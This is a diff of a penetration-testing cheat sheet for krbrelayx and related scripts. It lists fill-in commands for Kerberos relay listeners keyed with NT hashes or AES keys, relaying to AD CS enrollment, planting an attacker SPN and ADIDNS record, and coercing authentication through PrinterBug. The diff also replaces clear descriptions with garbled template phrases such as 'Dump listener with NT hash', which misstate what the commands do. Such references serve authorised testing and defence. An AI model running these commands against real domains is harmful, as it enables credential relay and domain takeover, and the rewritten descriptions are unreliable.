@@ -4,9 +4,9 @@
 
 ### Listener with AES key
 
-Start krbrelayx using an AES key to receive and decrypt incoming Kerberos authentication for a computer account.
+List listener with AES key with krbrelayx.
 
-```sh title:"Start krbrelayx with AES key"
+```sh title:"Krbrelayx List Listener with AES Key"
 krbrelayx.py -aesKey "$aes256_key"
 ```
 <!-- cheat
@@ -15,9 +15,9 @@ var aes256_key
 
 ### Listener with NT hash
 
-Start krbrelayx using an NT hash, commonly for user-account constrained or unconstrained delegation abuse.
+Dump listener with NT hash with krbrelayx.
 
-```sh title:"Start krbrelayx with NT hash"
+```sh title:"Krbrelayx Dump Listener with NT Hash"
 krbrelayx.py -hashes "aad3b435b51404eeaad3b435b51404ee:$nt_hash"
 ```
 <!-- cheat
@@ -26,9 +26,9 @@ var nt_hash
 
 ### AD CS relay
 
-Relay Kerberos authentication to AD CS web enrollment.
+List AD CS relay with krbrelayx.
 
-```sh title:"Relay Kerberos auth to AD CS"
+```sh title:"Krbrelayx List AD CS Relay"
 krbrelayx.py --target "http://$ca_fqdn/certsrv" --adcs --template "$template_name" --victim "$victim_fqdn"
 ```
 <!-- cheat
@@ -41,9 +41,9 @@ var victim_fqdn
 
 ### Add attacker SPN
 
-Add an SPN to a compromised account so Kerberos authentication can be routed to the attacker host.
+Add attacker SPN with krbrelayx.
 
-```sh title:"Add attacker SPN with addspn.py"
+```sh title:"Krbrelayx Add Attacker SPN"
 addspn.py -u "$domain/$compromised_account" -p "aad3b435b51404eeaad3b435b51404ee:$nt_hash" -s "HOST/$attacker_fqdn" --additional "$dc_fqdn"
 ```
 <!-- cheat
@@ -56,9 +56,9 @@ var dc_fqdn
 
 ### Remove attacker SPN
 
-Clean up the added SPN.
+Remove attacker SPN with krbrelayx.
 
-```sh title:"Remove attacker SPN with addspn.py"
+```sh title:"Krbrelayx Remove Attacker SPN"
 addspn.py -u "$domain/$compromised_account" -p "aad3b435b51404eeaad3b435b51404ee:$nt_hash" -s "HOST/$attacker_fqdn" --additional "$dc_fqdn" --delete
 ```
 <!-- cheat
@@ -71,9 +71,9 @@ var dc_fqdn
 
 ### Add attacker DNS record
 
-Add an ADIDNS record pointing the attacker FQDN to your host.
+Add attacker DNS record with krbrelayx.
 
-```sh title:"Add attacker DNS record with dnstool"
+```sh title:"Krbrelayx Add Attacker DNS Record"
 dnstool.py -u "$domain/$compromised_account" -p "aad3b435b51404eeaad3b435b51404ee:$nt_hash" -r "$attacker_fqdn" -d "$lhost" --action add "$dc_fqdn"
 ```
 <!-- cheat
@@ -87,9 +87,9 @@ var dc_fqdn
 
 ### Query DNS record
 
-Check the ADIDNS record before or after cleanup.
+Query DNS record with krbrelayx.
 
-```sh title:"Query ADIDNS record with dnstool"
+```sh title:"Krbrelayx Query DNS Record"
 dnstool.py -u "$domain/$user" -p "$pass" --record "$attacker_fqdn" --action query "$dc_fqdn"
 ```
 <!-- cheat
@@ -104,9 +104,9 @@ var dc_fqdn
 
 ### PrinterBug to listener
 
-Coerce a target running Print Spooler to authenticate to the attacker FQDN.
+List PrinterBug to listener with krbrelayx.
 
-```sh title:"Coerce PrinterBug auth to krbrelayx listener"
+```sh title:"Krbrelayx List PrinterBug to Listener"
 printerbug.py "$domain/$user:$pass@$target_fqdn" "$attacker_fqdn"
 ```
 <!-- cheat
@@ -119,9 +119,9 @@ var attacker_fqdn
 
 ### Export captured ticket
 
-Use a captured ccache with Kerberos-aware tools.
+Run export captured ticket with krbrelayx.
 
-```sh title:"Use captured krbrelayx ccache"
+```sh title:"Krbrelayx Run Export Captured Ticket"
 export KRB5CCNAME="$ccache_file"
 ```
 <!-- cheat
